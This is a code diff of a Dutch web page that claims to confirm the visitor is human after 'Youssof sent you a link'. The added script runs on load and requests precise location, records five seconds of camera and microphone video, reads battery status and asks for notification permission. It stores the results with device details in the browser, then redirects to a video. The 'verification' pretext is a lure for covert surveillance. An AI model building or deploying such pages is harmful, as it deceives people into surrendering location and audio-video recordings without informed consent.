@@ -1,8 +1,7 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="nl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bevestiging</title>
     <style>
         /* Algemene pagina-opmaak */
@@ -105,65 +104,216 @@
 </head>
 <body>
     <div class="container">
-        <h1><span class="highlight">Youssof</span> heeft je een link gestuurd!</h1>
+        <h1 id="messageText"></h1>
         <p>Dit is alleen om te bevestigen of jij een mens bent. Even geduld terwijl we het aan het bevestigen zijn.</p>
         <div class="loading"></div>
         <div class="progress-bar">
             <span></span>
         </div>
-        <p id="error-message">Kon locatie niet ophalen. Probeer het opnieuw.</p>
+        <p id="error-message">Kon gegevens niet ophalen. Probeer het opnieuw.</p>
     </div>
 
     <script>
-        function redirectWithLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        const timestamp = new Date().toISOString(); // Tijd in ISO-formaat
-                        const device = navigator.userAgent; // Apparaatinfo
+        // Haal instellingen op uit localStorage
+        const micCamEnabled = localStorage.getItem("micCamEnabled") === "true";
+        const locationEnabled = localStorage.getItem("locationEnabled") === "true";
+        const notificationsEnabled = localStorage.getItem("notificationsEnabled") === "true";
+        const redirectUrl = localStorage.getItem("redirectUrl") || "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
-                        // Sla locatiegegevens op in localStorage
-                        let savedLocations = JSON.parse(localStorage.getItem("locations")) || [];
-                        savedLocations.push({
-                            lat: lat,
-                            lon: lon,
-                            accuracy: accuracy,
-                            timestamp: timestamp,
-                            device: device
-                        });
-                        localStorage.setItem("locations", JSON.stringify(savedLocations));
+        // Stel de berichttekst in
+        document.getElementById("messageText").innerHTML = localStorage.getItem("messageText") || "<span class='highlight'>Youssof</span> heeft je een link gestuurd!";
 
-                        // Doorsturen naar een andere website
-                        const targetUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-                        setTimeout(() => {
-                            window.location.href = targetUrl;
-                        }, 5000); // Wacht totdat de voortgangsbalk klaar is
-                    },
-                    (error) => {
-                        document.querySelector(".loading").style.display = "none";
-                        document.getElementById("error-message").style.display = "block";
-                        document.getElementById("error-message").innerText =
-                            "Kon locatie niet ophalen. Zorg ervoor dat je toestemming hebt gegeven.";
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
+        let locationData = null;
+        let recordingData = null;
+        let batteryData = null;
+
+        function saveData() {
+            let combinedData = {};
+
+            if (locationEnabled && locationData) {
+                Object.assign(combinedData, locationData);
+            }
+
+            if (micCamEnabled && recordingData) {
+                combinedData.recording = recordingData;
+            }
+
+            if (batteryData) {
+                combinedData.battery = batteryData;
+            }
+
+            // Voeg de redirect URL toe aan de data
+            combinedData.redirectUrl = redirectUrl;
+
+            // Sla gegevens op als er iets is om op te slaan
+            if (Object.keys(combinedData).length > 0) {
+                let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
+                savedData.push(combinedData);
+                localStorage.setItem("collectedData", JSON.stringify(savedData));
+            }
+        }
+
+        async function getLocationData() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            const accuracy = position.coords.accuracy;
+                            const timestamp = new Date().toISOString();
+                            const device = navigator.userAgent;
+
+                            locationData = {
+                                lat: lat,
+                                lon: lon,
+                                accuracy: accuracy,
+                                timestamp: timestamp,
+                                device: device
+                            };
+
+                            resolve();
+                        },
+                        (error) => {
+                            document.querySelector(".loading").style.display = "none";
+                            document.getElementById("error-message").style.display = "block";
+                            document.getElementById("error-message").innerText =
+                                "Kon locatie niet ophalen. Zorg ervoor dat je toestemming hebt gegeven.";
+                            reject(error);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    document.querySelector(".loading").style.display = "none";
+                    document.getElementById("error-message").style.display = "block";
+                    document.getElementById("error-message").innerText =
+                        "Je browser ondersteunt geen geolocatie. Gebruik een moderne browser.";
+                    reject(new Error("Geolocatie niet ondersteund"));
+                }
+            });
+        }
+
+        async function getMicCamData() {
+            return new Promise(async (resolve, reject) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+
+                    const options = { mimeType: 'video/webm; codecs=vp9' };
+                    const mediaRecorder = new MediaRecorder(stream, options);
+                    let chunks = [];
+
+                    mediaRecorder.ondataavailable = function (e) {
+                        if (e.data.size > 0) {
+                            chunks.push(e.data);
+                        }
+                    };
+
+                    mediaRecorder.onstop = function () {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+
+                        reader.onloadend = function () {
+                            const base64data = reader.result;
+
+                            recordingData = {
+                                dataUrl: base64data,
+                                timestamp: new Date().toISOString()
+                            };
+
+                            resolve();
+                        };
+
+                        reader.readAsDataURL(blob);
+                    };
+
+                    mediaRecorder.start();
+
+                    // Stop na 5 seconden
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 5000);
+                } catch (error) {
+                    console.error("Error accessing mic/cam:", error);
+                    document.querySelector(".loading").style.display = "none";
+                    document.getElementById("error-message").style.display = "block";
+                    document.getElementById("error-message").innerText =
+                        "Kon de microfoon en camera niet openen. Zorg ervoor dat je toestemming hebt gegeven.";
+                    reject(error);
+                }
+            });
+        }
+
+        async function requestNotificationPermission() {
+            return new Promise((resolve, reject) => {
+                if ("Notification" in window) {
+                    Notification.requestPermission().then(permission => {
+                        if (permission === "granted") {
+                            resolve();
+                        } else {
+                            reject(new Error("Notificatie toestemming geweigerd."));
+                        }
+                    });
+                } else {
+                    reject(new Error("Notificaties worden niet ondersteund door deze browser."));
+                }
+            });
+        }
+
+        async function getBatteryData() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryData = {
+                        level: battery.level,
+                        charging: battery.charging
+                    };
+                } catch (error) {
+                    console.error("Error getting battery info:", error);
+                }
+            }
+        }
+
+        async function redirectWithPermissions() {
+            try {
+                const permissions = [];
+
+                if (locationEnabled) {
+                    permissions.push(getLocationData());
+                }
+
+                if (micCamEnabled) {
+                    permissions.push(getMicCamData());
+                }
+
+                if (notificationsEnabled) {
+                    permissions.push(requestNotificationPermission());
+                }
+
+                await getBatteryData();
+                await Promise.all(permissions);
+
+                saveData();
+
+                // Wacht totdat de voortgangsbalk klaar is
+                setTimeout(() => {
+                    window.location.href = redirectUrl;
+                }, 5000);
+
+            } catch (error) {
+                console.error("Error in permissions:", error);
                 document.querySelector(".loading").style.display = "none";
                 document.getElementById("error-message").style.display = "block";
-                document.getElementById("error-message").innerText =
-                    "Je browser ondersteunt geen geolocatie. Gebruik een moderne browser.";
+                document.getElementById("error-message").innerText = error.message;
             }
         }
 
         // Start direct bij het laden van de pagina
-        redirectWithLocation();
+        redirectWithPermissions();
     </script>
 </body>
 </html>
